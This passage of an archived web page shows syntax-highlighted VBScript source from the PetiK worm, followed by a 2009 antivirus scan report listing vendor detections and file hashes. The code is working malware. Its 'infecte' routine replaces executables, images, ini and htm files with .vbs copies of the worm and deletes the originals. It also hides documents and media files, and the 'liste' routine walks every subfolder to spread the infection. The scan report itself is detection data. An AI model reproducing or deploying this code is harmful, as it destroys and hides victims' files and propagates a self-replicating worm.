</span><span class="sc3">elseif</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"exe"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"ini"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"gif"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"jpg"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"htm"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">cr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.CreateTextFile</span><span class="sc6">(</span><span class="sc7">f1.path&amp;</span><span class="sc4">".vbs"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">cr.Write</span><span class="sc0"> </span><span class="sc7">vbscopie</span><span class="sc0">
</span><span class="sc7">cr.Close</span><span class="sc0">
</span><span class="sc7">fso.DeleteFile</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">elseif</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"mp3"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"doc"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"xls"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"ppt"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"hlp"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">att</span><span class="sc6">=</span><span class="sc7">fso.GetFile</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">att.attributes</span><span class="sc6">=</span><span class="sc7">att.attributes</span><span class="sc6">+</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">liste</span><span class="sc6">(</span><span class="sc7">dossier</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetFolder</span><span class="sc6">(</span><span class="sc7">dossier</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">sf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">f.SubFolders</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">f1</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">sf</span><span class="sc0">
</span><span class="sc7">infecte</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">liste</span><span class="sc6">(</span><span class="sc7">f1.path</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span>
<br><span class="sc0"><table border="1"><tr><td colspan="4">File PetiK.vbs received on 2009.06.10 04:05:48 (UTC)</td></tr><tr><td>Antivirus</td><td>Version</td><td>Last Update</td><td>Result</td</tr><tr><td>a-squared</td><td>4.5.0.18</td><td>2009.06.10</td><td style="color: red;">VBS.Lee.Based!IK</td</tr><tr><td>AhnLab-V3</td><td>5.0.0.2</td><td>2009.06.09</td><td style="color: red;">VBS/Petik</td</tr><tr><td>AntiVir</td><td>7.9.0.183</td><td>2009.06.09</td><td style="color: red;">Worm/Petik.A1</td</tr><tr><td>Antiy-AVL</td><td>2.0.3.1</td><td>2009.06.10</td><td>-</td</tr><tr><td>Authentium</td><td>5.1.2.4</td><td>2009.06.10</td><td style="color: red;">VBS/Pica.Q</td</tr><tr><td>Avast</td><td>4.8.1335.0</td><td>2009.06.09</td><td style="color: red;">VBS:Malware-gen</td</tr><tr><td>AVG</td><td>8.5.0.339</td><td>2009.06.09</td><td style="color: red;">VBS/Level</td</tr><tr><td>BitDefender</td><td>7.2</td><td>2009.06.10</td><td style="color: red;">Generic.ScriptWorm.C6E6F4BD</td</tr><tr><td>CAT-QuickHeal</td><td>10.00</td><td>2009.06.10</td><td style="color: red;">VBS/Petik</td</tr><tr><td>ClamAV</td><td>0.94.1</td><td>2009.06.10</td><td>-</td</tr><tr><td>Comodo</td><td>1299</td><td>2009.06.10</td><td style="color: red;">Worm.VBS.Email-Worm.Lee-based</td</tr><tr><td>DrWeb</td><td>5.0.0.12182</td><td>2009.06.10</td><td style="color: red;">SCRIPT.WORM.Virus</td</tr><tr><td>eSafe</td><td>7.0.17.0</td><td>2009.06.09</td><td style="color: red;">VBS.Smile.</td</tr><tr><td>eTrust-Vet</td><td>31.6.6550</td><td>2009.06.09</td><td style="color: red;">VBS/VBSWG!generic</td</tr><tr><td>F-Prot</td><td>4.4.4.56</td><td>2009.06.10</td><td style="color: red;">VBS/Pica.Q</td</tr><tr><td>F-Secure</td><td>8.0.14470.0</td><td>2009.06.09</td><td style="color: red;">Email-Worm.VBS.Lee-based</td</tr><tr><td>Fortinet</td><td>3.117.0.0</td><td>2009.06.09</td><td style="color: red;">VBS/LeeBased.E@mm</td</tr><tr><td>GData</td><td>19</td><td>2009.06.10</td><td style="color: red;">Generic.ScriptWorm.C6E6F4BD</td</tr><tr><td>Ikarus</td><td>T3.1.1.59.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>K7AntiVirus</td><td>7.10.757</td><td>2009.06.08</td><td>-</td</tr><tr><td>Kaspersky</td><td>7.0.0.125</td><td>2009.06.10</td><td style="color: red;">Email-Worm.VBS.Lee-based</td</tr><tr><td>McAfee</td><td>5641</td><td>2009.06.09</td><td style="color: red;">VBS/Generic</td</tr><tr><td>McAfee+Artemis</td><td>5641</td><td>2009.06.09</td><td style="color: red;">VBS/Generic</td</tr><tr><td>McAfee-GW-Edition</td><td>6.7.6</td><td>2009.06.10</td><td style="color: red;">Worm.Petik.A1</td</tr><tr><td>Microsoft</td><td>1.4701</td><td>2009.06.10</td><td style="color: red;">Worm:VBS/LoveLetter.gen</td</tr><tr><td>NOD32</td><td>4142</td><td>2009.06.09</td><td style="color: red;">probably unknown SCRIPT</td</tr><tr><td>Norman</td><td>6.01.09</td><td>2009.06.09</td><td style="color: red;">VBS/Lee-based.F</td</tr><tr><td>nProtect</td><td>2009.1.8.0</td><td>2009.06.10</td><td style="color: red;">VBS.Petik.F@mm</td</tr><tr><td>Panda</td><td>10.0.0.14</td><td>2009.06.09</td><td style="color: red;">VBS/Petik.A</td</tr><tr><td>PCTools</td><td>4.4.2.0</td><td>2009.06.09</td><td style="color: red;">VBS.Petik.F</td</tr><tr><td>Prevx</td><td>3.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>Rising</td><td>21.33.20.00</td><td>2009.06.10</td><td style="color: red;">Unknown Script Virus</td</tr><tr><td>Sophos</td><td>4.42.0</td><td>2009.06.10</td><td style="color: red;">VBS/VBSWG-2B</td</tr><tr><td>Sunbelt</td><td>3.2.1858.2</td><td>2009.06.09</td><td>-</td</tr><tr><td>Symantec</td><td>1.4.4.12</td><td>2009.06.10</td><td style="color: red;">VBS.Pet_Tick.A@mm</td</tr><tr><td>TheHacker</td><td>6.3.4.3.342</td><td>2009.06.10</td><td>-</td</tr><tr><td>TrendMicro</td><td>8.950.0.1092</td><td>2009.06.09</td><td style="color: red;">VBS_PETIK.F</td</tr><tr><td>VBA32</td><td>3.12.10.7</td><td>2009.06.10</td><td style="color: red;">IRC-Worm.IRC.Generic</td</tr><tr><td>ViRobot</td><td>2009.6.9.1775</td><td>2009.06.09</td><td style="color: red;">VBS.Petik.F</td</tr><tr><td>VirusBuster</td><td>4.6.5.0</td><td>2009.06.09</td><td style="color: red;">VBS.Petik.F</td</tr><tr><td colspan="4">&nbsp;</td></tr><tr><td colspan="4">Additional information</td></tr><tr><td colspan="4">File size: 9766 bytes</td></tr><tr><td colspan="4">MD5...: c9103a19fecc9f28dda136a81899d2fe</td></tr><tr><td colspan="4">SHA1..: e06a3a4da1ce93f9005977877c85733a057da4e0</td></tr><tr><td colspan="4">SHA256: 4c7c2f2844974461532b32adea283728e737edd2c65dd7b6ac66f2325de78461</td></tr><tr><td colspan="4">ssdeep: -<br></td></tr><tr><td colspan="4">PEiD..: -</td></tr><tr><td colspan="4">TrID..: File type identification<br>Unknown!</td></tr><tr><td colspan="4">PEInfo: -</td></tr><tr><td colspan="4">PDFiD.: -</td></tr><tr><td colspan="4">RDS...: NSRL Reference Data Set<br>-</td></tr></table></span></div></body>
</html>
